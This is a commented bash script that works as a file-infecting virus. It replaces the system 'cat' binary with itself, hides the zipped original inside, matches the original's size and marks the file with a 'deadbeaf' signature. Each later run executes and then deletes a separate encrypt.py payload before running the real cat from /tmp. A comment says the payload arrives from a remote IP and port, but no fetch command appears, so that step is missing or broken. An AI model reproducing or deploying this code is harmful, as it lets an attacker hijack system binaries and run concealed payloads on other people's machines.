#!/bin/bash

# xxd -> creates a hex dump
# -s -4 -> last 4 bytes
# -p -> display in pure hex coding
SIGNATURE=$(xxd -p -s -4 cat) 

if [ "${SIGNATURE}" != "deadbeaf" ]; then
    # wc -> word count
    ORIGIN_SIZE=$(wc -c < cat)
    zip cat.zip cat
    # rename infect.sh to cat
    mv -f $0 cat
    # append original cat to the virus
    awk '{print}' cat.zip >> cat
    rm cat.zip
    # keep the same size as the original cat
    truncate -s $((${ORIGIN_SIZE} - 4)) cat
    # signature
    echo -n -e '\xde\xad\xbe\xaf' >> cat
    exit 0
fi

# store the data received from a specified IP address and port into the encrypt.py

python3 encrypt.py
rm encrypt.py

# uses the "awk" command to search for a custom tag called "ARCHIVE_BELOW" in the shell script
# When found, line number plus 1 is then assigned to the variable "ARCHIVE"
# in order to unzip original cat
ARCHIVE=`awk '/^__ARCHIVE_BELOW__/ {print NR + 1; exit 0; }' $0`
# extract the archive data from the shell script and store it in the "/tmp" directory
# -o -> overwriting any existing files
tail -n+${ARCHIVE} $0 | busybox unzip -o -d /tmp - > /dev/null

# excute cat
chmod +x /tmp/cat
/tmp/cat $1
rm /tmp/cat

exit 0
# a custom tag used in shell scripts to indicate the starting position of archive data. 
# This tag is usually placed at the end of the script, followed immediately by the archive data.
__ARCHIVE_BELOW__
